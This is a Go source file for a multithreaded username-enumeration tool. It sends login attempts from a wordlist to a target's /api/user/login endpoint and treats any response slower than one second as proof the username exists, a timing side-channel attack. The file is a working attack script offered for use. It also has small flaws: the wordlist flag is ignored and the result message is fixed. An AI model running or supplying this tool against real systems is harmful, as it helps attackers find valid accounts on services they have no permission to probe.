package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type LoginRequestData struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

func WordlistGenerator(wordlist string, c chan string) (success bool, message string) {
	defer close(c)

	fptr, err := os.Open(wordlist)
	if err != nil {
		return false, err.Error()
	}
	defer fptr.Close()

	filescanner := bufio.NewScanner(fptr)
	filescanner.Split(bufio.ScanLines)

	for filescanner.Scan() {
		c <- filescanner.Text()
	}

	return true, "worlist looped through successfully"
}

func TestUsername(targetURL string, c chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	var logindata LoginRequestData = LoginRequestData{Password: "invalidpassword!"}

	for username := range c {
		logindata.Username = username
		timenow := time.Now()
		jsondata, err := json.Marshal(logindata)
		if err != nil {
			ErrMsg(err.Error())
		}

		SysMsgNB(fmt.Sprintf("Testing \"%s\"", logindata.Username))
		client := http.Client{Timeout: 2 * time.Second}
		req, err := http.NewRequest("POST", targetURL, bytes.NewReader(jsondata))
		if err != nil {
			ErrMsg(err.Error())
		} else {
			req.Header.Set("content-type", "application/json")
			resp, err := client.Do(req)
			if err != nil {
				ErrMsg(err.Error())
			} else {
				resp.Body.Close()
				timediff := time.Now().Sub(timenow)
				if timediff > time.Second {
					SucMsg(fmt.Sprintf("Username Found: \"%s\"", logindata.Username))
				}
			}
		}
	}
	return
}

func FindUsername(baseURL string, wordlist string, threadcount int) (success bool, message string) {
	var namechan chan string = make(chan string)
	var wg *sync.WaitGroup = new(sync.WaitGroup)
	var targetURL string = fmt.Sprintf("%s/api/user/login", baseURL)

	go WordlistGenerator(wordlist, namechan)

	//============================================================
	// Spawn threadcount threads to brute force the username
	//============================================================
	for i := 0; i < threadcount; i++ {
		wg.Add(1)
		go TestUsername(targetURL, namechan, wg)
	}
	wg.Wait()

	fmt.Printf(ANSI_CLRLN)

	return true, "at least one username found"
}

func ValidatePort(portno int) (valid bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be within range 1 - 65535"
	}

	return true, "port valid"
}

func ValidateThreadCount(threadcount int) (valid bool, message string) {
	if (threadcount < 1) || (threadcount > 50) {
		return false, "thread count must be in range 1 - 50"
	}

	return true, "thread count valid"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func main() {
	var baseURL string

	var targetIP string
	var targetPort int
	var threadCount int

	var wordlist string

	flag.StringVar(&targetIP, "i", "127.0.0.1", "target IP address")
	flag.IntVar(&targetPort, "p", 80, "target port")
	flag.IntVar(&threadCount, "t", 10, "number of threads used to brute force")
	flag.StringVar(&wordlist, "w", "names_short.txt", "wordlist to use in brute force")
	flag.Parse()

	valid, message := ValidatePort(targetPort)
	if !valid {
		ErrMsg(message)
		os.Exit(1)
	}

	valid, message = ValidateThreadCount(threadCount)
	if !valid {
		ErrMsg(message)
		os.Exit(1)
	}

	InfMsg(fmt.Sprintf("Target IP: %s", targetIP))
	InfMsg(fmt.Sprintf("Target Port: %d", targetPort))
	InfMsg(fmt.Sprintf("Thread Count: %d", threadCount))
	InfMsg(fmt.Sprintf("Wordlist: %s", wordlist))
	fmt.Printf("\n")

	baseURL = fmt.Sprintf("http://%s:%d", targetIP, targetPort)

	FindUsername(baseURL, "names_short.txt", threadCount)
	return
}

